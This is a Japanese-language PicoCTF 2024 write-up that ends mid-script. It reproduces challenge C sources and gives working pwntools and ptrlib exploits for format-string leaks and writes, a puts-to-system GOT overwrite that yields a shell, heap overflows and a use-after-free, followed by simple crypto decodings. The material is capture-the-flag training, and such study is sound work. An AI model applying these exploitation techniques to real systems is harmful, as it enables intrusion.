<p>PicoCTF 2024に参加したのでWriteupを書きました。
解いた問題は以下の通り。</p>
<ul>
<li>Binary Exploitation
<ul>
<li>[x] format string0</li>
<li>[x] format string1</li>
<li>[x] format string2</li>
<li>[x] format string3</li>
<li>[x] heap 0</li>
<li>[x] heap 1</li>
<li>[x] heap 2</li>
<li>[x] heap 3</li>
<li>[ ] babygame03</li>
<li>[ ] high frequency troubles</li>
</ul>
</li>
<li>Cryptography
<ul>
<li>[x] interencdec</li>
<li>[x] custom encryption</li>
<li>[ ] c3</li>
<li>[ ] rsa_oracle</li>
<li>[ ] flag_printer</li>
</ul>
</li>
<li>Forensics
<ul>
<li>[x] scan surprise</li>
<li>[x] verify</li>
<li>[x] canyousee</li>
<li>[x] secret of the polyglot</li>
<li>[x] mob psycho</li>
<li>[x] endianness-v2</li>
<li>[ ] blast from the past</li>
<li>[ ] dear diary</li>
</ul>
</li>
<li>General Skills
<ul>
<li>[x] super ssh</li>
<li>[x] commitment issues</li>
<li>[x] time machine</li>
<li>[x] blame game</li>
<li>[x] collaborative development</li>
<li>[x] binhexa</li>
<li>[x] binary search</li>
<li>[x] endianness</li>
<li>[x] dont-you-love-banners</li>
<li>[ ] sansalpha</li>
</ul>
</li>
<li>Reverse Engineering
<ul>
<li>[x] packer</li>
<li>[x] factcheck</li>
<li>[ ] winantidbg0x100</li>
<li>[x] classic crackme 0x100</li>
<li>[ ] weirdsnake</li>
<li>[ ] winantidbg0x200</li>
<li>[ ] winantidbg0x300</li>
</ul>
</li>
<li>Web Exploitation
<ul>
<li>[x] bookmarklet</li>
<li>[x] webdecode</li>
<li>[x] introtoburp</li>
<li>[x] unminify</li>
<li>[x] no sql injection</li>
<li>[x] trickster</li>
<li>[ ] elements</li>
</ul>
</li>
</ul>
<p>去年よりも成長していて嬉しい。</p>
<h1>Binary Exploitation</h1>
<h2>format string 0</h2>
<p>ソースコードが渡された。</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;signal.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;

#define BUFSIZE 32
#define FLAGSIZE 64

char flag[FLAGSIZE];

void sigsegv_handler(int sig) {
    printf(&quot;\n%s\n&quot;, flag);
    fflush(stdout);
    exit(1);
}

int on_menu(char *burger, char *menu[], int count) {
    for (int i = 0; i &lt; count; i++) {
        if (strcmp(burger, menu[i]) == 0)
            return 1;
    }
    return 0;
}

void serve_patrick();

void serve_bob();


int main(int argc, char **argv){
    FILE *f = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
    if (f == NULL) {
        printf(&quot;%s %s&quot;, &quot;Please create 'flag.txt' in this directory with your&quot;,
                        &quot;own debugging flag.\n&quot;);
        exit(0);
    }

    fgets(flag, FLAGSIZE, f);
    signal(SIGSEGV, sigsegv_handler);

    gid_t gid = getegid();
    setresgid(gid, gid, gid);

    serve_patrick();

    return 0;
}

void serve_patrick() {
    printf(&quot;%s %s\n%s\n%s %s\n%s&quot;,
            &quot;Welcome to our newly-opened burger place Pico 'n Patty!&quot;,
            &quot;Can you help the picky customers find their favorite burger?&quot;,
            &quot;Here comes the first customer Patrick who wants a giant bite.&quot;,
            &quot;Please choose from the following burgers:&quot;,
            &quot;Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe&quot;,
            &quot;Enter your recommendation: &quot;);
    fflush(stdout);

    char choice1[BUFSIZE];
    scanf(&quot;%s&quot;, choice1);
    char *menu1[3] = {&quot;Breakf@st_Burger&quot;, &quot;Gr%114d_Cheese&quot;, &quot;Bac0n_D3luxe&quot;};
    if (!on_menu(choice1, menu1, 3)) {
        printf(&quot;%s&quot;, &quot;There is no such burger yet!\n&quot;);
        fflush(stdout);
    } else {
        int count = printf(choice1);
        if (count &gt; 2 * BUFSIZE) {
            serve_bob();
        } else {
            printf(&quot;%s\n%s\n&quot;,
                    &quot;Patrick is still hungry!&quot;,
                    &quot;Try to serve him something of larger size!&quot;);
            fflush(stdout);
        }
    }
}

void serve_bob() {
    printf(&quot;\n%s %s\n%s %s\n%s %s\n%s&quot;,
            &quot;Good job! Patrick is happy!&quot;,
            &quot;Now can you serve the second customer?&quot;,
            &quot;Sponge Bob wants something outrageous that would break the shop&quot;,
            &quot;(better be served quick before the shop owner kicks you out!)&quot;,
            &quot;Please choose from the following burgers:&quot;,
            &quot;Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak&quot;,
            &quot;Enter your recommendation: &quot;);
    fflush(stdout);

    char choice2[BUFSIZE];
    scanf(&quot;%s&quot;, choice2);
    char *menu2[3] = {&quot;Pe%to_Portobello&quot;, &quot;$outhwest_Burger&quot;, &quot;Cla%sic_Che%s%steak&quot;};
    if (!on_menu(choice2, menu2, 3)) {
        printf(&quot;%s&quot;, &quot;There is no such burger yet!\n&quot;);
        fflush(stdout);
    } else {
        printf(choice2);
        fflush(stdout);
    }
}
</code></pre>
<p>入力に<code>{&quot;Breakf@st_Burger&quot;, &quot;Gr%114d_Cheese&quot;, &quot;Bac0n_D3luxe&quot;}</code>以外の文字列が含まれていた場合、入力がそのまま<code>printf</code>に渡されている。また、<code>main</code>関数内でflagを読み込んでいる。よって、普通にメモリをリークすれば良い。
<em>command:</em></p>
<pre><code class="language-bash">python -c 'print(&quot;%s&quot; * 24)' | ./format-string-0
</code></pre>
<p><em>output:</em></p>
<pre><code>Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: There is no such burger yet!

picoCTF{fake_local_flag}
</code></pre>
<h2>format string 1</h2>
<p>ソースコードが渡された。</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;


int main() {
  char buf[1024];
  char secret1[64];
  char flag[64];
  char secret2[64];

  // Read in first secret menu item
  FILE *fd = fopen(&quot;secret-menu-item-1.txt&quot;, &quot;r&quot;);
  if (fd == NULL){
    printf(&quot;'secret-menu-item-1.txt' file not found, aborting.\n&quot;);
    return 1;
  }
  fgets(secret1, 64, fd);
  // Read in the flag
  fd = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
  if (fd == NULL){
    printf(&quot;'flag.txt' file not found, aborting.\n&quot;);
    return 1;
  }
  fgets(flag, 64, fd);
  // Read in second secret menu item
  fd = fopen(&quot;secret-menu-item-2.txt&quot;, &quot;r&quot;);
  if (fd == NULL){
    printf(&quot;'secret-menu-item-2.txt' file not found, aborting.\n&quot;);
    return 1;
  }
  fgets(secret2, 64, fd);

  printf(&quot;Give me your order and I'll read it back to you:\n&quot;);
  fflush(stdout);
  scanf(&quot;%1024s&quot;, buf);
  printf(&quot;Here's your order: &quot;);
  printf(buf);
  printf(&quot;\n&quot;);
  fflush(stdout);

  printf(&quot;Bye!\n&quot;);
  fflush(stdout);

  return 0;
}
</code></pre>
<p><code>scanf</code>で入力を受け取り、そのまま<code>printf</code>に渡している。
format string0と同じように%sを大量に渡してメモリリークをしようとすると<code>segmentation fault</code>が起こってしまうので、<code>%x</code>でリークして文字列に変換する。
<em>command1:</em></p>
<pre><code class="language-bash">python -c 'print(&quot;%lx.&quot;*20)' | ./format-string-1
</code></pre>
<p><em>output1:</em></p>
<pre><code>Give me your order and I'll read it back to you:
Here's your order: 7ffdf8a41a10.0.0.a.400.9.0.0.7ac85b362ab0.7ffd00000000.7ffdf8a41c38.0.7ffdf8a41c40.7b4654436f636970.636f6c5f656b6166.7d67616c665f6c61.a.0.7ac85b3577b7.7ac85b363680.
Bye!
</code></pre>
<p><em>command2:</em></p>
<pre><code class="language-bash">python decode.py 7ffdf8a41a10.0.0.a.400.9.0.0.7ac85b362ab0.7ffd00000000.7ffdf8a41c38.0.7ffdf8a41c40.7b4654436f636970.636f6c5f656b6166.7d67616c665f6c61.a.0.7ac85b3577b7.7ac85b363680
</code></pre>
<p><em>output2:</em></p>
<pre><code>b'\x10\x1a\xa4\xf8\xfd\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb0*6[\xc8z\x00\x00\x00\x00\x00\x00\xfd\x7f\x00\x008\x1c\xa4\xf8\xfd\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x1c\xa4\xf8\xfd\x7f\x00\x00picoCTF{fake_local_flag}\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb7w5[\xc8z\x00\x00\x8066[\xc8z\x00\x00'
</code></pre>
<h2>format string2</h2>
<p>ソースコードが渡された。</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];


  printf(&quot;You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n&quot;);
  fflush(stdout);
  scanf(&quot;%1024s&quot;, buf);
  printf(&quot;Here's your input: &quot;);
  printf(buf);
  printf(&quot;\n&quot;);
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf(&quot;I have NO clue how you did that, you must be a wizard. Here you go...\n&quot;);

    // Read in the flag
    FILE *fd = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
    fgets(flag, 64, fd);

    printf(&quot;%s&quot;, flag);
    fflush(stdout);
  }
  else {
    printf(&quot;sus = 0x%x\n&quot;, sus);
    printf(&quot;You can do better!\n&quot;);
    fflush(stdout);
  }

  return 0;
}
</code></pre>
<p>format stringで<code>sus</code>の値を改変できれば良い。
pwntoolsを使って自動化した。</p>
<pre><code class="language-python">#!/usr/bin/env python

import pwn
import sys

exe = pwn.ELF(&quot;./vuln&quot;)
pwn.context.binary = exe


def connect(remote: bool):
    if remote:
        return pwn.remote(&quot;rhea.picoctf.net&quot;, 51654)
    else:
        return pwn.process(exe.path)


def send(p):
    io = connect(False)

    pwn.log.info(&quot;payload  = %s&quot; % repr(p))
    io.sendline(p)
    resp = io.recvall()
    if b&quot;picoCTF&quot; in resp:
        pwn.log.info(&quot;Flag = %s&quot; % resp)
    return resp


sus_addr = 0x404060

fs = pwn.FmtStr(execute_fmt=send)
fs.write(sus_addr, 0x67616C66)
fs.execute_writes()
</code></pre>
<h2>format string 3</h2>
<p>ソースコードが渡された。</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;

#define MAX_STRINGS 32

char *normal_string = &quot;/bin/sh&quot;;

void setup() {
        setvbuf(stdin, NULL, _IONBF, 0);
        setvbuf(stdout, NULL, _IONBF, 0);
        setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
        puts(&quot;Howdy gamers!&quot;);
        printf(&quot;Okay I'll be nice. Here's the address of setvbuf in libc: %p\n&quot;, &amp;setvbuf);
}

int main() {
        char *all_strings[MAX_STRINGS] = {NULL};
        char buf[1024] = {'\0'};

        setup();
        hello();

        fgets(buf, 1024, stdin);
        printf(buf);

        puts(normal_string);

        return 0;
}
</code></pre>
<p><code>main</code>関数の最後に<code>&quot;/bin/sh&quot;</code>を<code>puts</code>に渡すというこれ見よがしな処理をしている。
また、明らかなformat stringの脆弱性がある。よって、format stringで<code>puts</code>のGOTを<code>system</code>に書き換えればシェルが取れそう。</p>
<pre><code class="language-python">#!/usr/bin/env python3
import pwn

exe = pwn.ELF(&quot;./format-string-3_patched&quot;)
libc = pwn.ELF(&quot;./libc.so.6&quot;)
ld = pwn.ELF(&quot;./ld-linux-x86-64.so.2&quot;)
pwn.context.binary = exe

payload = b&quot;&quot;


def connect():
    # io = pwn.process(exe.path)
    io = pwn.remote(&quot;rhea.picoctf.net&quot;, 64906)
    return io


def b(x):
    return x.to_bytes(8, &quot;little&quot;)


def send(p):
    global payload
    io = pwn.process(exe.path)
    io.sendline(p)
    payload = p
    resp = io.recvall()
    return resp


def main():
    io = connect()

    io.recvuntil(b&quot;setvbuf in libc: &quot;)
    leak = int(io.recvline().strip(), 16)
    libc.address = leak - libc.symbols[&quot;setvbuf&quot;]

    pwn.log.info(&quot;libc.address = %s&quot; % hex(libc.address))

    fs = pwn.FmtStr(execute_fmt=send)
    fs.write(exe.got[&quot;puts&quot;], libc.symbols[&quot;system&quot;])
    fs.execute_writes()

    with open(&quot;./payload&quot;, &quot;wb&quot;) as f:
        f.write(payload)

    io.sendline(payload)
    io.recvuntil(b&quot;\x18@@&quot;)
    io.interactive()


if __name__ == &quot;__main__&quot;:
    main()
</code></pre>
<h2>heap0</h2>
<p>ソースコードが渡された。</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

#define FLAGSIZE_MAX 64
// amount of memory allocated for input_data
#define INPUT_DATA_SIZE 5
// amount of memory allocated for safe_var
#define SAFE_VAR_SIZE 5

int num_allocs;
char *safe_var;
char *input_data;

void check_win() {
    if (strcmp(safe_var, &quot;bico&quot;) != 0) {
        printf(&quot;\nYOU WIN\n&quot;);

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
        fgets(buf, FLAGSIZE_MAX, fd);
        printf(&quot;%s\n&quot;, buf);
        fflush(stdout);

        exit(0);
    } else {
        printf(&quot;Looks like everything is still secure!\n&quot;);
        printf(&quot;\nNo flage for you :(\n&quot;);
        fflush(stdout);
    }
}

void print_menu() {
    printf(&quot;\n1. Print Heap:\t\t(print the current state of the heap)&quot;
           &quot;\n2. Write to buffer:\t(write to your own personal block of data &quot;
           &quot;on the heap)&quot;
           &quot;\n3. Print safe_var:\t(I'll even let you look at my variable on &quot;
           &quot;the heap, &quot;
           &quot;I'm confident it can't be modified)&quot;
           &quot;\n4. Print Flag:\t\t(Try to print the flag, good luck)&quot;
           &quot;\n5. Exit\n\nEnter your choice: &quot;);
    fflush(stdout);
}

void init() {
    printf(&quot;\nWelcome to heap0!\n&quot;);
    printf(
        &quot;I put my data on the heap so it should be safe from any tampering.\n&quot;);
    printf(&quot;Since my data isn't on the stack I'll even let you write whatever &quot;
           &quot;info you want to the heap, I already took care of using malloc for &quot;
           &quot;you.\n\n&quot;);
    fflush(stdout);
    input_data = malloc(INPUT_DATA_SIZE);
    strncpy(input_data, &quot;pico&quot;, INPUT_DATA_SIZE);
    safe_var = malloc(SAFE_VAR_SIZE);
    strncpy(safe_var, &quot;bico&quot;, SAFE_VAR_SIZE);
}

void write_buffer() {
    printf(&quot;Data for buffer: &quot;);
    fflush(stdout);
    scanf(&quot;%s&quot;, input_data);
}

void print_heap() {
    printf(&quot;Heap State:\n&quot;);
    printf(&quot;+-------------+----------------+\n&quot;);
    printf(&quot;[*] Address   -&gt;   Heap Data   \n&quot;);
    printf(&quot;+-------------+----------------+\n&quot;);
    printf(&quot;[*]   %p  -&gt;   %s\n&quot;, input_data, input_data);
    printf(&quot;+-------------+----------------+\n&quot;);
    printf(&quot;[*]   %p  -&gt;   %s\n&quot;, safe_var, safe_var);
    printf(&quot;+-------------+----------------+\n&quot;);
    fflush(stdout);
}

int main(void) {

    // Setup
    init();
    print_heap();

    int choice;

    while (1) {
        print_menu();
        int rval = scanf(&quot;%d&quot;, &amp;choice);
        if (rval == EOF){
            exit(0);
        }
        if (rval != 1) {
            //printf(&quot;Invalid input. Please enter a valid choice.\n&quot;);
            //fflush(stdout);
            // Clear input buffer
            //while (getchar() != '\n');
            //continue;
            exit(0);
        }

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print safe_var
            printf(&quot;\n\nTake a look at my variable: safe_var = %s\n\n&quot;,
                   safe_var);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf(&quot;Invalid choice\n&quot;);
            fflush(stdout);
        }
    }
}
</code></pre>
<p>heap領域に<code>safe_var</code>と<code>input_var</code>という変数を確保して<code>input_var</code>に値を書いたり読んだり、フラグの読み取りを試みたりできるプログラムになっている。</p>
<p><code>init</code>でmallocを使って<code>safe_var</code>と<code>input_var</code>を作り、それぞれ、<code>&quot;pico&quot;</code>と<code>&quot;bico&quot;</code>に初期化している。init関数終了時点でのheapは以下のようになっている。</p>
<pre><code>0x5555555596a0                          0x0000000000000021      ........!.......
0x5555555596b0  0x000000006f636970      0x0000000000000000      pico............
0x5555555596c0  0x0000000000000000      0x0000000000000021      ........!.......
0x5555555596d0  0x000000006f636962      0x0000000000000000      bico............
0x5555555596e0  0x0000000000000000      0x0000000000020921      ........!.......
</code></pre>
<p><code>write_buffer</code>では入力のサイズを確認せず、そのまま<code>input_data</code>に書き込んでいる。
よって、ここにheap overflowの脆弱性がある。
フラグを得るには<code>safe_var</code>の値<code>&quot;bico&quot;</code>を他の適当な値に改変すれば良いので、exploitは以下のようになる。</p>
<pre><code class="language-python">#!/usr/bin/env python
import pwn


def connect():
    return pwn.process(&quot;./vuln&quot;)


io = connect()
io.sendline(b&quot;2&quot;)
io.sendline(b&quot;a&quot; * 33)
io.sendline(b&quot;4&quot;)
io.recvuntil(b&quot;YOU WIN\n&quot;)


print(io.recvline())
</code></pre>
<h2>heap1</h2>
<p>ソースコードが渡された。</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

#define FLAGSIZE_MAX 64
// amount of memory allocated for input_data
#define INPUT_DATA_SIZE 5
// amount of memory allocated for safe_var
#define SAFE_VAR_SIZE 5

int num_allocs;
char *safe_var;
char *input_data;

void check_win() {
    if (!strcmp(safe_var, &quot;pico&quot;)) {
        printf(&quot;\nYOU WIN\n&quot;);

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
        fgets(buf, FLAGSIZE_MAX, fd);
        printf(&quot;%s\n&quot;, buf);
        fflush(stdout);

        exit(0);
    } else {
        printf(&quot;Looks like everything is still secure!\n&quot;);
        printf(&quot;\nNo flage for you :(\n&quot;);
        fflush(stdout);
    }
}

void print_menu() {
    printf(&quot;\n1. Print Heap:\t\t(print the current state of the heap)&quot;
           &quot;\n2. Write to buffer:\t(write to your own personal block of data &quot;
           &quot;on the heap)&quot;
           &quot;\n3. Print safe_var:\t(I'll even let you look at my variable on &quot;
           &quot;the heap, &quot;
           &quot;I'm confident it can't be modified)&quot;
           &quot;\n4. Print Flag:\t\t(Try to print the flag, good luck)&quot;
           &quot;\n5. Exit\n\nEnter your choice: &quot;);
    fflush(stdout);
}

void init() {
    printf(&quot;\nWelcome to heap1!\n&quot;);
    printf(
        &quot;I put my data on the heap so it should be safe from any tampering.\n&quot;);
    printf(&quot;Since my data isn't on the stack I'll even let you write whatever &quot;
           &quot;info you want to the heap, I already took care of using malloc for &quot;
           &quot;you.\n\n&quot;);
    fflush(stdout);
    input_data = malloc(INPUT_DATA_SIZE);
    strncpy(input_data, &quot;pico&quot;, INPUT_DATA_SIZE);
    safe_var = malloc(SAFE_VAR_SIZE);
    strncpy(safe_var, &quot;bico&quot;, SAFE_VAR_SIZE);
}

void write_buffer() {
    printf(&quot;Data for buffer: &quot;);
    fflush(stdout);
    scanf(&quot;%s&quot;, input_data);
}

void print_heap() {
    printf(&quot;Heap State:\n&quot;);
    printf(&quot;+-------------+----------------+\n&quot;);
    printf(&quot;[*] Address   -&gt;   Heap Data   \n&quot;);
    printf(&quot;+-------------+----------------+\n&quot;);
    printf(&quot;[*]   %p  -&gt;   %s\n&quot;, input_data, input_data);
    printf(&quot;+-------------+----------------+\n&quot;);
    printf(&quot;[*]   %p  -&gt;   %s\n&quot;, safe_var, safe_var);
    printf(&quot;+-------------+----------------+\n&quot;);
    fflush(stdout);
}

int main(void) {

    // Setup
    init();
    print_heap();

    int choice;

    while (1) {
        print_menu();
        if (scanf(&quot;%d&quot;, &amp;choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print safe_var
            printf(&quot;\n\nTake a look at my variable: safe_var = %s\n\n&quot;,
                   safe_var);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf(&quot;Invalid choice\n&quot;);
            fflush(stdout);
        }
    }
}
</code></pre>
<p>heap0とほとんど同じだが、フラグを得るための条件が<code>safe_var</code>の値を<code>&quot;pico&quot;</code>に変更するというものに変わっている。よってexploitは以下のようになる。</p>
<pre><code class="language-python">#!/usr/bin/env python
import pwn


def connect():
    return pwn.process(&quot;./chall&quot;)


io = connect()
io.sendline(b&quot;2&quot;)
payload = b&quot;&quot;
payload += b&quot;A&quot; * 32
payload += b&quot;pico&quot;
io.sendline(payload)
io.sendline(b&quot;4&quot;)
io.recvuntil(b&quot;YOU WIN\n&quot;)
print(io.recvline())
</code></pre>
<h2>heap2</h2>
<p>ソースコードが渡された。</p>
<pre><code class="language-c">include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

#define FLAGSIZE_MAX 64

int num_allocs;
char *x;
char *input_data;

void win() {
    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
    fgets(buf, FLAGSIZE_MAX, fd);
    printf(&quot;%s\n&quot;, buf);
    fflush(stdout);

    exit(0);
}

void check_win() { ((void (*)())*(int*)x)(); }

void print_menu() {
    printf(&quot;\n1. Print Heap\n2. Write to buffer\n3. Print x\n4. Print Flag\n5. &quot;
           &quot;Exit\n\nEnter your choice: &quot;);
    fflush(stdout);
}

void init() {

    printf(&quot;\nI have a function, I sometimes like to call it, maybe you should change it\n&quot;);
    fflush(stdout);

    input_data = malloc(5);
    strncpy(input_data, &quot;pico&quot;, 5);
    x = malloc(5);
    strncpy(x, &quot;bico&quot;, 5);
}

void write_buffer() {
    printf(&quot;Data for buffer: &quot;);
    fflush(stdout);
    scanf(&quot;%s&quot;, input_data);
}

void print_heap() {
    printf(&quot;[*]   Address   -&gt;   Value   \n&quot;);
    printf(&quot;+-------------+-----------+\n&quot;);
    printf(&quot;[*]   %p  -&gt;   %s\n&quot;, input_data, input_data);
    printf(&quot;+-------------+-----------+\n&quot;);
    printf(&quot;[*]   %p  -&gt;   %s\n&quot;, x, x);
    fflush(stdout);
}

int main(void) {

    // Setup
    init();

    int choice;

    while (1) {
        print_menu();
        if (scanf(&quot;%d&quot;, &amp;choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print x
            printf(&quot;\n\nx = %s\n\n&quot;, x);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf(&quot;Invalid choice\n&quot;);
            fflush(stdout);
        }
    }
}
</code></pre>
<p>プログラムの構造はこれまでと同じ。しかし、今回は<code>check_win</code>で条件を満たしていたらフラグを出力するのではなく、<code>x</code>の値を関数として呼んでいる。
今回はフラグを出力する<code>win</code>という関数があるので、<code>x</code>の値を<code>win</code>のアドレスに変更できればフラグを獲得できる。</p>
<pre><code class="language-python">#!/usr/bin/env python

import ptrlib as ptr

io = ptr.Process(&quot;./chall&quot;)

win_addr = 0x00000000004011A0

io.recvuntil(b&quot;Enter your choice: &quot;)
io.sendline(b&quot;2&quot;)
io.sendline(b&quot;A&quot; * 32 + ptr.p64(win_addr))
io.sendline(b&quot;4&quot;)

print(io.recvlineafter(b&quot;Enter your choice:&quot;))
</code></pre>
<h2>heap3</h2>
<p>ソースコードが渡された。</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

#define FLAGSIZE_MAX 64

// Create struct
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5];
} object;

int num_allocs;
object *x;

void check_win() {
  if(!strcmp(x-&gt;flag, &quot;pico&quot;)) {
    printf(&quot;YOU WIN!!11!!\n&quot;);

    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
    fgets(buf, FLAGSIZE_MAX, fd);
    printf(&quot;%s\n&quot;, buf);
    fflush(stdout);

    exit(0);

  } else {
    printf(&quot;No flage for u :(\n&quot;);
    fflush(stdout);
  }
  // Call function in struct
}

void print_menu() {
    printf(&quot;\n1. Print Heap\n2. Allocate object\n3. Print x-&gt;flag\n4. Check for win\n5. Free x\n6. &quot;
           &quot;Exit\n\nEnter your choice: &quot;);
    fflush(stdout);
}

// Create a struct
void init() {

    printf(&quot;\nfreed but still in use\nnow memory untracked\ndo you smell the bug?\n&quot;);
    fflush(stdout);

    x = malloc(sizeof(object));
    strncpy(x-&gt;flag, &quot;bico&quot;, 5);
}

void alloc_object() {
    printf(&quot;Size of object allocation: &quot;);
    fflush(stdout);
    int size = 0;
    scanf(&quot;%d&quot;, &amp;size);
    char* alloc = malloc(size);
    printf(&quot;Data for flag: &quot;);
    fflush(stdout);
    scanf(&quot;%s&quot;, alloc);
}

void free_memory() {
    free(x);
}

void print_heap() {
    printf(&quot;[*]   Address   -&gt;   Value   \n&quot;);
    printf(&quot;+-------------+-----------+\n&quot;);
    printf(&quot;[*]   %p  -&gt;   %s\n&quot;, x-&gt;flag, x-&gt;flag);
    printf(&quot;+-------------+-----------+\n&quot;);
    fflush(stdout);
}

int main(void) {

    // Setup
    init();

    int choice;

    while (1) {
        print_menu();
        if (scanf(&quot;%d&quot;, &amp;choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            alloc_object();
            break;
        case 3:
            // print x
            printf(&quot;\n\nx = %s\n\n&quot;, x-&gt;flag);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            free_memory();
            break;
        case 6:
            // exit
            return 0;
        default:
            printf(&quot;Invalid choice\n&quot;);
            fflush(stdout);
        }
    }
}
</code></pre>
<p>heap2までとほとんど同じ。<code>free_memory</code>で<code>x</code>を解放し、<code>alloc_object</code>で<code>x</code>と同じサイズで<code>malloc</code>して、そこの30番目に<code>&quot;pico&quot;</code>を書き込む。</p>
<pre><code class="language-python">#!/usr/bin/env python

import ptrlib as ptr

def connect():
    p = ptr.Process(&quot;./chall&quot;)
    # p = ptr.Socket(&quot;tethys.picoctf.net&quot;, 65386)
    return p


io = connect()
io.sendline(b&quot;5&quot;)
io.sendline(b&quot;2&quot;)
io.sendline(b&quot;35&quot;)

payload = b&quot;&quot;
payload += b&quot;A&quot; * 30
payload += b&quot;pico&quot;

io.sendline(payload)
io.sendline(b&quot;4&quot;)

print(io.recvlineafter(&quot;YOU WIN!!11!!\n&quot;))
</code></pre>
<h1>Cryptography</h1>
<h2>interencdec</h2>
<p>以下の内容のファイルが渡された。</p>
<pre><code>YidkM0JxZGtwQlRYdHFhR3g2YUhsZmF6TnFlVGwzWVROclgya3lNRFJvYTJvMmZRPT0nCg==
</code></pre>
<p>base64っぽいのでデコード。</p>
<pre><code>d3BqdkpBTXtqaGx6aHlfazNqeTl3YTNrX2kyMDRoa2o2fQ==
</code></pre>
<p>これもbase64っぽいのでデコード</p>
<pre><code>wpjvJAM{jhlzhy_k3jy9wa3k_i204hkj6}
</code></pre>
<p>シーザー暗号っぽいので解読</p>
<pre><code>picoCTF{caesar_d3cr9pt3d_b204adc6}
</code></pre>
<h2>custom encryption</h2>
<p>暗号化プログラムのソースコードとフラグを暗号化したときの出力が渡された。</p>
<pre><code class="language-python">from random import randint
import sys


def generator(g, x, p):
    return pow(g, x) % p


def encrypt(plaintext, key):
    cipher = []
    for char in plaintext:
        cipher.append(((ord(char) * key*311)))
    return cipher


def is_prime(p):
    v = 0
    for i in range(2, p + 1):
        if p % i == 0:
            v = v + 1
    if v &gt; 1:
        return False
    else:
        return True


def dynamic_xor_encrypt(plaintext, text_key):
    cipher_text = &quot;&quot;
    key_length = len(text_key)
    for i, char in enumerate(plaintext[::-1]):
        key_char = text_key[i % key_length]
        encrypted_char = chr(ord(char) ^ ord(key_char))
        cipher_text += encrypted_char
    return cipher_text


def test(plain_text, text_key):
    p = 97
    g = 31
    if not is_prime(p) and not is_prime(g):
        print(&quot;Enter prime numbers&quot;)
        return
    a = randint(p-10, p)
    b = randint(g-10, g)
    print(f&quot;a = {a}&quot;)
    print(f&quot;b = {b}&quot;)
    u = generator(g, a, p)
    v = generator(g, b, p)
    key = generator(v, a, p)
    b_key = generator(u, b, p)
    shared_key = None
    if key == b_key:
        shared_key = key
    else:
        print(&quot;Invalid key&quot;)
        return
    semi_cipher = dynamic_xor_encrypt(plain_text, text_key)
    cipher = encrypt(semi_cipher, shared_key)
    print(f'cipher is: {cipher}')


if __name__ == &quot;__main__&quot;:
    message = sys.argv[1]
    test(message, &quot;trudeau&quot;)
</code></pre>
<pre><code>a = 94
b = 29
cipher is: [260307, 491691, 491691, 2487378, 2516301, 0, 1966764, 1879995, 1995687, 1214766, 0, 2400609, 607383, 144615, 1966764, 0, 636306, 2487378, 28923, 1793226, 694152, 780921, 173538, 173538, 491691, 173538, 751998, 1475073, 925536, 1417227, 751998, 202461, 347076, 491691]
</code></pre>
<p>このプログラムには、基本的に不可逆的で値を復元するのに工夫が必要な演算が含まれていない。したがってそのまま逆の処理をするプログラムを書けば良い。</p>
<pre><code class="language-python">#!/usr/bin/env python
from random import randint
import sys


def generator(g, x, p):
    return pow(g, x) % p


def is_prime(p):
    v = 0
    for i in range(2, p + 1):
        if p % i == 0:
            v = v + 1
